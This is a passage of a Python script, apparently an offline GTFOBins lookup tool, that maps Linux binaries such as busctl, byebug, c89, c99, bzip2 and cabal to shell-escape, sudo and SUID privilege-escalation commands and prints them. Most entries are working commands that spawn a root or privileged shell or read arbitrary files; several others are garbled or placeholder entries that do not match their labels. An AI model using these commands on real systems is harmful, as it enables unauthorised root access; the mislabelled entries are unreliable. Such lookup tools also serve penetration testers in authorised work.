            bins.append("busctl --show-machine\n!/bin/shsudo install -m =xs $(which busctl) .\n./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'")
        elif zip_options == "file-write":
            bins.append("busctl --user call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartUnit s ""your-service.service"" ""replace""")
        elif zip_options == "file-read":
            bins.append("busctl --user call <service-name> <object-path> <interface-name> <method-name> s ""path/to/your/file.txt""")

    elif zip_command == "byebug":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho 'system(""/bin/sh"")' > $TF\nbyebug $TF\ncontinue")
        elif zip_options == "suid":
            bins.append("TF=$(mktemp)\necho 'system(""/bin/sh"")' > $TF\n./byebug $TF\ncontinue")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp)\necho 'system(""/bin/sh"")' > $TF\nsudo byebug $TF\ncontinue")
        elif zip_options == "file-read":
            bins.append("ruby -r 'byebug' read_file.rb")
        elif zip_options == "file-write":
            bins.append("ruby -r 'byebug' write_to_file.rb")

    elif zip_command == "bzip2":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which bzip2) .\nLFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbzip2 -c $LFILE | bzip2 -d")
        elif zip_options == "file-write":
            bins.append("tar -cvjf malicious.tar.bz2 reverse_shell.sh")
        elif zip_options == "Shell":
            bins.append("tar -cvf malicious.tar reverse_shell.sh\nbzip2 malicious.tar")

    elif zip_command == "c89":
        if zip_options == "Shell":
            bins.append("c89 -wrapper /bin/sh,-s .")
        elif zip_options == "sudo":
            bins.append("sudo c89 -wrapper /bin/sh,-s .")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nc89 -x c -E ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which c89) .\nc89 -wrapper /bin/sh,-s .")

    elif zip_command == "c99":
        if zip_options == "Shell":
            bins.append("c99 -wrapper /bin/sh,-s .")
        elif zip_options == "sudo":
            bins.append("sudo c99 -wrapper /bin/sh,-s .")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nc99 -x c -E ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which c99) .\nc99 -wrapper /bin/sh,-s .")

    elif zip_command == "cabal":
        if zip_options == "Shell":
            bins.append("cabal exec -- /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo cabal exec -- /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cabal) .\n./cabal exec -- /bin/sh -p")
        elif zip_options == "file-write":
            bins.append("cabal build")
        elif zip_options == "file-read":
            bins.append("cabal build\ncabal run")

#If there are any other misconfigurations run the other option
    elif zip_command == "other":
        if zip_options == "Shell": #This will print out hints for more GTFO bins!
            bins.append("Please refer to the GTFO bins website for more!")
        elif zip_options == "sudo": #This will give a git clone command to run when more bins are needed but available
            bins.append("If git is install please run \ngit clone https://github.com/GTFOBins/GTFOBins.github.io.git\nThen cd into the directory and then into the folder marked _gtfobins")
            
    return bins

def main():
    print_logo()
    print("*If a GTFO bin is not found please type 'other' then 'sudo'*")
    start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")

    #Tool selection for Linux misconfigurations
    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "other":  
        zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")

        if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
            bins = gtfo_bins(start, zip_options)  # Call the gtfo_bins function with the correct arguments
            print("\nSuggested GTFO Bins:\n")
            for bin in bins:
                print(bin)
        else:
            print("\nInvalid option for the chosen tool.\n")
    else:
        print("\nTool not found. Please enter a valid tool name (e.g., 'zip', '7zip', 'base64' or 'other').\n")

if __name__ == "__main__":
    main()